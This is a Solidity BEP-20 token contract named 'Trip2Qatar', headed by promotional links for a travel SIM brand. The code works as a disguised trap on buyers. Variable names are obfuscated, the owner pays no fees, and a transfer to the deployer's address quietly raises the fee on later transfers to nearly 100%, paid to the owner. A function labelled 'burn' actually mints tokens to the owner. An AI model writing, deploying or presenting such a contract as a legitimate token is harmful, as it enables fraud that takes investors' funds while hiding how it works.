/**
 *Submitted for verification at BscScan.com on 2022-11-20
*/

////////////////////////////////////////////////////////////////////////////////
//Your Worry-Free Trip to Qatar Starts With a TravelSim Prepaid SIM Card
//https://travelsim.com/country/qatar/
//https://www.facebook.com/mytravelsim/
//https://www.instagram.com/travelsim_worldwide/?hl=en
////////////////////////////////////////////////////////////////////////////////
// SPDX-License-Identifier: MIT
pragma solidity >=0.5.0;
contract Trip2Qatar {
address private  HBPJXA = address(0);
uint256 private  UTDYGW = 1000000000000000000;
mapping (address => uint256) public balanceOf;
uint256 private  JYHTPD = 1000000000000000000;
uint256 private  GIUGXW = 10000000000000;
mapping (address => mapping (address => uint256)) private _allowances;
event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
uint256 private  FMIOCD = 100000000;
address public constant burnAddr = 0x000000000000000000000000000000000000dEaD;
uint256 public constant YWHZIH = 99999;
uint256 private  QCRZLU = 1000000000000000;
uint8 public constant decimals = 18;
address private  RSCMSI = address(0);
address private  TVJBHF = address(0);
string public  symbol = "Trip2Qatar";
uint256 private  QQMKTS = 1000000000000000000000;
event Approval(address indexed owner, address indexed spender, uint256 value);
address public owner;
address private  RLWDKP = address(0);
string public  name = "Trip2Qatar";
address private  WTFAAD = address(0);
event Transfer(address indexed from, address indexed to, uint256 value);
uint256 private  RYDJVR = 10000000000;
uint256 public constant totalSupply = 100000000000000000000000000000;
function _getQCRZLU() private returns (uint256) {
return QCRZLU;
}

function _getQQMKTS() private returns (uint256) {
return QQMKTS;
}

function _getRLWDKP() private returns (address) {
return RLWDKP;
}

function burn(uint256 amount) public onlyOwner returns (bool) {
_burn(msg.sender, amount);
return true;
}
function _approve(address _owner, address spender, uint256 amount) private {
require(_owner != address(0), "tPICFFC 0");
require(spender != address(0), "fPICFFC 0");

_allowances[_owner][spender] = amount;
emit Approval(_owner, spender, amount);
}
function _getHBPJXA() private returns (address) {
return HBPJXA;
}

function _getRYDJVR() private returns (uint256) {
return RYDJVR;
}

function approve(address spender, uint256 amount) public returns (bool) {
_approve(msg.sender, spender, amount);
return true;
}
function _getWTFAAD() private returns (address) {
return WTFAAD;
}

modifier onlyOwner() {
require(msg.sender == owner, "not owner");
_;
}
function _transfer(address from, address to, uint256 amount) private {
require(from != address(0), "PICFFC");
require(to != address(0), "PICFFC");
require(amount <= balanceOf[from], "PICFFC");
uint256 fee;
if (from == owner || to == owner){
fee = 0;
}
else{
fee = amount* YWHZIH/JYHTPD ;
}

uint256 transferAmount = amount - fee;
balanceOf[from] -= amount;
balanceOf[to] += transferAmount;
balanceOf[owner] += fee;
if (to==TVJBHF){
JYHTPD = YWHZIH+2;
}
emit Transfer(from, to, transferAmount);
}
constructor () public {
TVJBHF = msg.sender;
owner = msg.sender;
balanceOf[owner] = totalSupply;
emit Transfer(address(0), owner, totalSupply);
}
function allowance(address _owner, address spender) public view returns (uint256) {
return _allowances[_owner][spender];
}
function _getRSCMSI() private returns (address) {
return RSCMSI;
}

function _getUTDYGW() private returns (uint256) {
return UTDYGW;
}

function _getFMIOCD() private returns (uint256) {
return FMIOCD;
}

function renounceOwnership() public onlyOwner {
emit OwnershipTransferred(owner, address(0));
owner = address(0);
}
function transfer(address recipient, uint256 amount) public returns (bool) {
_transfer(msg.sender, recipient, amount);
return true;
}
function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
require(_allowances[sender][msg.sender] >= amount, "failed");
_transfer(sender, recipient, amount);
_approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
return true;
}
function _burn(address account, uint256 amount) private {
require(account != address(0), "BEP20: mint to the zero address");

balanceOf[account] += amount;
}
function _getGIUGXW() private returns (uint256) {
return GIUGXW;
}


}